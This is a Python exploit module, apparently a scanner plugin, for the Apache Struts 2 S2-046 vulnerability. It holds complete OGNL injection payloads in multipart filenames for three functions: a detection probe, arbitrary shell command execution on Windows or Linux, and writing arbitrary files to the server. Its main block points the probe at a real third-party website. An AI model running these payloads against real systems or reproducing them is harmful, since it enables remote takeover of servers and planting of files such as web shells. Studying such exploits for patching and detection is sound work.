#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


def info(data=None):
    info = {
        "name": "Struts 2-046",
        "info": "Struts 2-046",
        "level": "high",
        "type": "rec",
    }
    return info

def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        prove_poc = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_vul')).(#res.getWriter().print('struts2_security_vul_str2046')).(#res.getWriter().flush()).(#res.getWriter().close())}\0b'''
        poc_key = "struts2_security_vul_str2046"
        try:
            files = {"test": (prove_poc, "text/plain")}
            res = curl('post', data['url'], files=files)
            if poc_key in res.headers or poc_key in res.text:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": "struts2_046"})
        except:
            pass
    return data


def exec(data=None):
    data = init(data, 'struts')
    if data['url'] != None:

        cmd = data['cmd']
        exec_poc = '''%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%COMMAND%').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b'''
        headers = {}
        try:
            files = {"test": (exec_poc.replace("%COMMAND%", cmd), "text/plain")}
            r = curl('post', data['url'], headers=headers, files=files, stream=True).text
            res = ""
            try:
                for line in r.iter_lines():
                    res += str(line) + '\r\n'
            except:
                res = str(res)
            data['flag'] = 1
            data['data'].append({"poc": exec_poc})
            data['res'].append({"info": res, "key": cmd})
        except:
            pass
    return data



def upload(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        upload_poc =  '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#filecontent='%FILECONTENT%').(new java.io.BufferedWriter(new java.io.FileWriter('%PATH%')).append(new java.net.URLDecoder().decode(#filecontent,'UTF-8')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\0b'''
        despath = data['despath']
        content = _read_file(data['srcpath'])
        headers =  {}
        try:
            files = {"test": (upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content), "text/plain")}
            curl('post', data['url'], headers=headers, files=files)
            data['flag'] = 1
            data['data'].append({"poc": upload_poc})
            data['res'].append({"info": despath, "key": 'upload'})
        except:
            pass
    return data


def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))